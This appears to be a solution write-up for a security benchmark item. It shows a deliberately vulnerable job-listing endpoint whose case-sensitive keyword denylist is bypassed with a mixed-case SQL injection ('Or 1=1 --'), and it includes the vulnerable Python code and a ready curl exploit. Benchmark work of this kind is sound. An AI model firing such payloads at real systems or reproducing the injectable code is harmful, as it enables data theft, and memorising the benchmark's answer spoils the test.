# XBEN-006-24 — Simple SQLi with allowlist (case-sensitivity bypass)

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Classic SQL injection in `POST /jobs`, `job_type` is concatenated raw into `SELECT * FROM jobs WHERE type = '{job_type}'`. A "denylist" strips the exact-case substrings `OR`, `or`, `AND`, `and`, `SELECT`, `select`, `UNION`, `union`, `FROM`, `from`, `WHERE`, `where` via `str.replace`, but the check is case-sensitive, so a mixed-case keyword like `Or` passes straight through untouched.


## Root cause (app/main.py)

```python
@app.post("/jobs")
async def jobs(request: Request):
    data = await request.json()
    job_type = data.get('job_type', '')
    if job_type and job_type == 'private':          # only blocks the EXACT literal string "private"
        return HTMLResponse(..., status_code=403)

    for denied_word in ['OR', 'or', 'AND', 'and', 'SELECT', 'select', 'UNION', 'union', 'FROM', 'from', 'WHERE', 'where']:
        job_type = job_type.replace(denied_word, '')  # case-sensitive strip, "Or"/"Select" etc. are missed

    query = f"SELECT * FROM jobs WHERE type = '{job_type}'"   # raw string concatenation
    cursor.execute(query)
```

The seed data (startup handler) stores the flag as the `description` of a `type='private'` row named "Hidden job".

## Exploit (copy-pasteable, port substituted for this run: 55387)

```bash
PORT=55387
BASE=http://localhost:$PORT

curl -s -X POST $BASE/jobs -H "Content-Type: application/json" \
  -d '{"job_type": "nonexistent'"'"' Or 1=1 -- "}'
```

This produces the query `SELECT * FROM jobs WHERE type = 'nonexistent' Or 1=1 -- '`, which (because `Or` survives the case-sensitive filter) returns every row, including the private "Hidden job" one.
